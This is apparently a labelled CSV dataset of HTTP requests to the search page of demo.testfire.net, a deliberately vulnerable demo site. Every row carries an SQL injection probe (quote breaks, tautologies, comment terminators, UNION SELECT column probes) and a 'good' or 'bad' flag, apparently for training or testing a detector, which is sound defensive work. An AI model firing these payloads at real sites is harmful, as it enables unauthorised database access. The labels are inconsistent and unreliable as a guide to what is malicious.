path,content,host,class_flag
"/search.jsp?query=""-- 2",,demo.testfire.net,['bad']
/search.jsp?query='=',,demo.testfire.net,['good']
/search.jsp?query=0'&lt;'2,,demo.testfire.net,['good']
"/search.jsp?query=""=""",,demo.testfire.net,['good']
"/search.jsp?query=0""&lt;""2",,demo.testfire.net,['good']
/search.jsp?query='),,demo.testfire.net,['good']
"/search.jsp?query="")",,demo.testfire.net,['good']
/search.jsp?query=')/*,,demo.testfire.net,['bad']
/search.jsp?query=')-- 2,,demo.testfire.net,['bad']
/search.jsp?query=')#,,demo.testfire.net,['good']
"/search.jsp?query="")-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="") #",,demo.testfire.net,['good']
"/search.jsp?query="")/*",,demo.testfire.net,['bad']
/search.jsp?query=')-(',,demo.testfire.net,['good']
/search.jsp?query=')&(',,demo.testfire.net,['good']
/search.jsp?query=')^(',,demo.testfire.net,['good']
/search.jsp?query=')*(',,demo.testfire.net,['bad']
/search.jsp?query=')=(',,demo.testfire.net,['good']
/search.jsp?query=0')&lt;('2,,demo.testfire.net,['good']
"/search.jsp?query="")-(""",,demo.testfire.net,['good']
"/search.jsp?query="")&(""",,demo.testfire.net,['good']
"/search.jsp?query="")^(""",,demo.testfire.net,['good']
"/search.jsp?query="")*(""",,demo.testfire.net,['bad']
"/search.jsp?query="")=(""",,demo.testfire.net,['good']
"/search.jsp?query=0"")&lt;(""2",,demo.testfire.net,['good']
/search.jsp?query='-''-- 2,,demo.testfire.net,['bad']
/search.jsp?query='-''#,,demo.testfire.net,['good']
/search.jsp?query='-''/*,,demo.testfire.net,['bad']
/search.jsp?query='&''-- 2,,demo.testfire.net,['bad']
/search.jsp?query='&''#,,demo.testfire.net,['good']
/search.jsp?query='^''-- 2,,demo.testfire.net,['bad']
/search.jsp?query='&''/*,,demo.testfire.net,['bad']
/search.jsp?query='^''#,,demo.testfire.net,['good']
/search.jsp?query='*''-- 2,,demo.testfire.net,['bad']
/search.jsp?query='^''/*,,demo.testfire.net,['bad']
/search.jsp?query='*''#,,demo.testfire.net,['bad']
/search.jsp?query='*''/*,,demo.testfire.net,['bad']
/search.jsp?query='=''-- 2,,demo.testfire.net,['bad']
/search.jsp?query='=''#,,demo.testfire.net,['good']
/search.jsp?query='=''/*,,demo.testfire.net,['bad']
/search.jsp?query=0'&lt;'2'-- 2,,demo.testfire.net,['bad']
/search.jsp?query=0'&lt;'2'#,,demo.testfire.net,['good']
/search.jsp?query=0'&lt;'2'/*,,demo.testfire.net,['bad']
"/search.jsp?query=""-""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""-""""#",,demo.testfire.net,['good']
"/search.jsp?query=""-""""/*",,demo.testfire.net,['bad']
"/search.jsp?query=""&""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""&""""#",,demo.testfire.net,['good']
"/search.jsp?query=""&""""/*",,demo.testfire.net,['bad']
"/search.jsp?query=""^""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""^""""#",,demo.testfire.net,['good']
"/search.jsp?query=""^""""/*",,demo.testfire.net,['bad']
"/search.jsp?query=""*""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""*""""#",,demo.testfire.net,['bad']
"/search.jsp?query=""*""""/*",,demo.testfire.net,['bad']
"/search.jsp?query=""=""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""=""""#",,demo.testfire.net,['good']
"/search.jsp?query=""=""""/*",,demo.testfire.net,['bad']
"/search.jsp?query=0""&lt;""2""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=0""&lt;""2""#",,demo.testfire.net,['good']
"/search.jsp?query=0""&lt;""2""/*",,demo.testfire.net,['bad']
/search.jsp?query=')-''-- 2,,demo.testfire.net,['bad']
/search.jsp?query=')-''#,,demo.testfire.net,['good']
/search.jsp?query=')-''/*,,demo.testfire.net,['bad']
/search.jsp?query=')&''-- 2,,demo.testfire.net,['bad']
/search.jsp?query=')&''#,,demo.testfire.net,['good']
/search.jsp?query=')&''/*,,demo.testfire.net,['bad']
/search.jsp?query=')^''-- 2,,demo.testfire.net,['bad']
/search.jsp?query=')^''#,,demo.testfire.net,['good']
/search.jsp?query=')^''/*,,demo.testfire.net,['bad']
/search.jsp?query=')*''-- 2,,demo.testfire.net,['bad']
/search.jsp?query=')*''#,,demo.testfire.net,['bad']
/search.jsp?query=')*''/*,,demo.testfire.net,['bad']
/search.jsp?query=')=''-- 2,,demo.testfire.net,['bad']
/search.jsp?query=')=''#,,demo.testfire.net,['good']
/search.jsp?query=')=''/*,,demo.testfire.net,['bad']
/search.jsp?query=0')&lt;'2'-- 2,,demo.testfire.net,['bad']
/search.jsp?query=0')&lt;'2'#,,demo.testfire.net,['good']
/search.jsp?query=0')&lt;'2'/*,,demo.testfire.net,['bad']
"/search.jsp?query="")-""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="")-""""#",,demo.testfire.net,['good']
"/search.jsp?query="")-""""/*",,demo.testfire.net,['bad']
"/search.jsp?query="")&""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="")&""""#",,demo.testfire.net,['good']
"/search.jsp?query="")&""""/*",,demo.testfire.net,['bad']
"/search.jsp?query="")^""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="")^""""#",,demo.testfire.net,['good']
"/search.jsp?query="")^""""/*",,demo.testfire.net,['bad']
"/search.jsp?query="")*""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="")*""""#",,demo.testfire.net,['bad']
"/search.jsp?query="")*""""/*",,demo.testfire.net,['bad']
"/search.jsp?query="")=""""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="")=""""#",,demo.testfire.net,['good']
"/search.jsp?query="")=""""/*",,demo.testfire.net,['bad']
"/search.jsp?query=0"")&lt;""2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=0"")&lt;""2#",,demo.testfire.net,['good']
"/search.jsp?query=0"")&lt;""2/*",,demo.testfire.net,['bad']
/search.jsp?query='oR'2,,demo.testfire.net,['good']
/search.jsp?query='oR'2'-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR'2'#,,demo.testfire.net,['good']
/search.jsp?query='oR'2'/*,,demo.testfire.net,['bad']
/search.jsp?query='oR'2'oR',,demo.testfire.net,['good']
/search.jsp?query='oR(2)-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR(2)#,,demo.testfire.net,['good']
/search.jsp?query='oR(2)/*,,demo.testfire.net,['bad']
/search.jsp?query='oR(2)oR',,demo.testfire.net,['good']
/search.jsp?query='oR 2-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR 2/*,,demo.testfire.net,['bad']
/search.jsp?query='oR 2#,,demo.testfire.net,['good']
/search.jsp?query='oR 2 oR',,demo.testfire.net,['good']
/search.jsp?query='oR/**/2-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR/**/2#,,demo.testfire.net,['bad']
/search.jsp?query='oR/**/2/*,,demo.testfire.net,['bad']
/search.jsp?query='oR/**/2/**/oR',,demo.testfire.net,['bad']
"/search.jsp?query=""oR""2",,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR""2""/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR""2""#",,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR(2)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(2)#",,demo.testfire.net,['good']
"/search.jsp?query=""oR(2)/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(2)oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR 2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR 2#",,demo.testfire.net,['good']
"/search.jsp?query=""oR 2/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR 2 oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR/**/2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR/**/2#",,demo.testfire.net,['bad']
"/search.jsp?query=""oR/**/2/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR/**/2/**/oR""",,demo.testfire.net,['bad']
/search.jsp?query='oR'2'='2,,demo.testfire.net,['good']
/search.jsp?query='oR'2'='2'oR',,demo.testfire.net,['good']
/search.jsp?query='oR'2'='2'-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR'2'='2'#,,demo.testfire.net,['good']
/search.jsp?query='oR'2'='2'/*,,demo.testfire.net,['bad']
/search.jsp?query='oR 2=2-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR 2=2#,,demo.testfire.net,['good']
/search.jsp?query='oR 2=2/*,,demo.testfire.net,['bad']
/search.jsp?query='oR 2=2 oR',,demo.testfire.net,['good']
/search.jsp?query='oR/**/2=2-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR/**/2=2#,,demo.testfire.net,['bad']
/search.jsp?query='oR/**/2=2/*,,demo.testfire.net,['bad']
/search.jsp?query='oR/**/2=2/**/oR',,demo.testfire.net,['bad']
/search.jsp?query='oR(2)=2-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR(2)=2#,,demo.testfire.net,['good']
/search.jsp?query='oR(2)=2/*,,demo.testfire.net,['bad']
/search.jsp?query='oR(2)=(2)oR',,demo.testfire.net,['good']
/search.jsp?query='oR'2'='2' LimIT 1-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR'2'='2' LimIT 1#,,demo.testfire.net,['good']
/search.jsp?query='oR'2'='2' LimIT 1/*,,demo.testfire.net,['bad']
/search.jsp?query='oR(2)=(2)LimIT(1)-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR(2)=(2)LimIT(1)#,,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""=""2",,demo.testfire.net,['good']
/search.jsp?query='oR(2)=(2)LimIT(1)/*,,demo.testfire.net,['bad']
"/search.jsp?query=""oR""2""=""2""oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""=""2""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR""2""=""2""#",,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""=""2""/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR 2=2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR 2=2#",,demo.testfire.net,['good']
"/search.jsp?query=""oR 2=2/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR 2=2 oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR/**/2=2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR/**/2=2#",,demo.testfire.net,['bad']
"/search.jsp?query=""oR/**/2=2/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR/**/2=2/**/oR""",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(2)=2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(2)=2#",,demo.testfire.net,['good']
"/search.jsp?query=""oR(2)=2/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(2)=(2)oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""=""2"" LimIT 1-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR""2""=""2"" LimIT 1#",,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""=""2"" LimIT 1/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(2)=(2)LimIT(1)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(2)=(2)LimIT(1)#",,demo.testfire.net,['good']
"/search.jsp?query=""oR(2)=(2)LimIT(1)/*",,demo.testfire.net,['bad']
/search.jsp?query='oR true-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR true#,,demo.testfire.net,['good']
/search.jsp?query='oR true oR',,demo.testfire.net,['good']
/search.jsp?query='oR true/*,,demo.testfire.net,['bad']
/search.jsp?query='oR(true)#,,demo.testfire.net,['good']
/search.jsp?query='oR(true)-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR(true)/*,,demo.testfire.net,['bad']
/search.jsp?query='oR(true)oR',,demo.testfire.net,['good']
/search.jsp?query='oR/**/true-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR/**/true#,,demo.testfire.net,['bad']
/search.jsp?query='oR/**/true/*,,demo.testfire.net,['bad']
/search.jsp?query='oR/**/true/**/oR',,demo.testfire.net,['bad']
"/search.jsp?query=""oR true-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR true#",,demo.testfire.net,['good']
"/search.jsp?query=""oR true oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR true/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(true)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(true)#",,demo.testfire.net,['good']
"/search.jsp?query=""oR(true)/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(true)oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR/**/true-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR/**/true#",,demo.testfire.net,['bad']
"/search.jsp?query=""oR/**/true/*",,demo.testfire.net,['bad']
/search.jsp?query='oR'2'LiKE'2,,demo.testfire.net,['good']
"/search.jsp?query=""oR/**/true/**/oR""",,demo.testfire.net,['bad']
/search.jsp?query='oR'2'LiKE'2'-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR'2'LiKE'2'#,,demo.testfire.net,['good']
/search.jsp?query='oR'2'LiKE'2'/*,,demo.testfire.net,['bad']
/search.jsp?query='oR'2'LiKE'2'oR',,demo.testfire.net,['good']
/search.jsp?query='oR(2)LiKE(2)-- 2,,demo.testfire.net,['bad']
/search.jsp?query='oR(2)LiKE(2)#,,demo.testfire.net,['good']
/search.jsp?query='oR(2)LiKE(2)/*,,demo.testfire.net,['bad']
/search.jsp?query='oR(2)LiKE(2)oR',,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""LiKE""2",,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""LiKE""2""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR""2""LiKE""2""#",,demo.testfire.net,['good']
"/search.jsp?query=""oR""2""LiKE""2""/*",,demo.testfire.net,['bad']
"/search.jsp?query=""oR""2""LiKE""2""oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR(2)LiKE(2)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""oR(2)LiKE(2)#",,demo.testfire.net,['good']
"/search.jsp?query=""oR(2)LiKE(2)oR""",,demo.testfire.net,['good']
"/search.jsp?query=""oR(2)LiKE(2)/*",,demo.testfire.net,['bad']
/search.jsp?query=admin,,demo.testfire.net,['good']
/search.jsp?query=admin'-- 2,,demo.testfire.net,['bad']
/search.jsp?query=admin'#,,demo.testfire.net,['good']
"/search.jsp?query=admin""-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=admin""#",,demo.testfire.net,['good']
/search.jsp?query=ffifdyop,,demo.testfire.net,['good']
"/search.jsp?query=' UniON SElecT 1,2,3-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=' UniON SElecT 1,2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=' UniON SElecT 1,2,3,4-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=' UniON SElecT 1,2,3,4,5-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=' UniON SElecT 1,2#",,demo.testfire.net,['good']
"/search.jsp?query=' UniON SElecT 1,2,3#",,demo.testfire.net,['good']
"/search.jsp?query=' UniON SElecT 1,2,3,4#",,demo.testfire.net,['good']
"/search.jsp?query='UniON(SElecT(1),2)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=' UniON SElecT 1,2,3,4,5#",,demo.testfire.net,['good']
"/search.jsp?query='UniON(SElecT(1),2,3)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query='UniON(SElecT(1),2,3,4)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query='UniON(SElecT(1),2,3,4,5)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query='UniON(SElecT(1),2)#",,demo.testfire.net,['good']
"/search.jsp?query='UniON(SElecT(1),2,3)#",,demo.testfire.net,['good']
"/search.jsp?query='UniON(SElecT(1),2,3,4)#",,demo.testfire.net,['good']
"/search.jsp?query='UniON(SElecT(1),2,3,4,5)#",,demo.testfire.net,['good']
"/search.jsp?query="" UniON SElecT 1,2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="" UniON SElecT 1,2,3-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="" UniON SElecT 1,2,3,4-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="" UniON SElecT 1,2,3,4,5-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="" UniON SElecT 1,2#",,demo.testfire.net,['good']
"/search.jsp?query="" UniON SElecT 1,2,3#",,demo.testfire.net,['good']
"/search.jsp?query=""UniON(SElecT(1),2)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query="" UniON SElecT 1,2,3,4#",,demo.testfire.net,['good']
"/search.jsp?query="" UniON SElecT 1,2,3,4,5#",,demo.testfire.net,['good']
"/search.jsp?query=""UniON(SElecT(1),2,3)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""UniON(SElecT(1),2,3,4)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""UniON(SElecT(1),2,3,4,5)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""UniON(SElecT(1),2)#",,demo.testfire.net,['good']
"/search.jsp?query=""UniON(SElecT(1),2,3)#",,demo.testfire.net,['good']
"/search.jsp?query=""UniON(SElecT(1),2,3,4)#",,demo.testfire.net,['good']
"/search.jsp?query=""UniON(SElecT(1),2,3,4,5)#",,demo.testfire.net,['good']
/search.jsp?query='||'2,,demo.testfire.net,['bad']
/search.jsp?query='||2-- 2,,demo.testfire.net,['bad']
/search.jsp?query='||'2'||',,demo.testfire.net,['bad']
/search.jsp?query='||2#,,demo.testfire.net,['bad']
/search.jsp?query='||2/*,,demo.testfire.net,['bad']
/search.jsp?query='||2||',,demo.testfire.net,['bad']
"/search.jsp?query=""||2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""||""2",,demo.testfire.net,['bad']
"/search.jsp?query=""||""2""||""",,demo.testfire.net,['bad']
"/search.jsp?query=""||2#",,demo.testfire.net,['bad']
"/search.jsp?query=""||2/*",,demo.testfire.net,['bad']
"/search.jsp?query=""||2||""",,demo.testfire.net,['bad']
/search.jsp?query='||'2'='2,,demo.testfire.net,['bad']
/search.jsp?query='||'2'='2'||',,demo.testfire.net,['bad']
/search.jsp?query='||2=2-- 2,,demo.testfire.net,['bad']
/search.jsp?query='||2=2#,,demo.testfire.net,['bad']
/search.jsp?query='||2=2/*,,demo.testfire.net,['bad']
/search.jsp?query='||2=2||',,demo.testfire.net,['bad']
"/search.jsp?query=""||""2""=""2",,demo.testfire.net,['bad']
"/search.jsp?query=""||""2""=""2""||""",,demo.testfire.net,['bad']
"/search.jsp?query=""||2=2-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""||2=2#",,demo.testfire.net,['bad']
"/search.jsp?query=""||2=2/*",,demo.testfire.net,['bad']
"/search.jsp?query=""||2=2||""",,demo.testfire.net,['bad']
/search.jsp?query='||2=(2)LimIT(1)-- 2,,demo.testfire.net,['bad']
/search.jsp?query='||2=(2)LimIT(1)#,,demo.testfire.net,['bad']
/search.jsp?query='||2=(2)LimIT(1)/*,,demo.testfire.net,['bad']
"/search.jsp?query=""||2=(2)LimIT(1)-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""||2=(2)LimIT(1)#",,demo.testfire.net,['bad']
"/search.jsp?query=""||2=(2)LimIT(1)/*",,demo.testfire.net,['bad']
/search.jsp?query='||true-- 2,,demo.testfire.net,['bad']
/search.jsp?query='||true#,,demo.testfire.net,['bad']
/search.jsp?query='||true/*,,demo.testfire.net,['bad']
/search.jsp?query='||true||',,demo.testfire.net,['bad']
"/search.jsp?query=""||true-- 2",,demo.testfire.net,['bad']
"/search.jsp?query=""||true#",,demo.testfire.net,['bad']
"/search.jsp?query=""||true/*",,demo.testfire.net,['bad']
"/search.jsp?query=""||true||""",,demo.testfire.net,['bad']
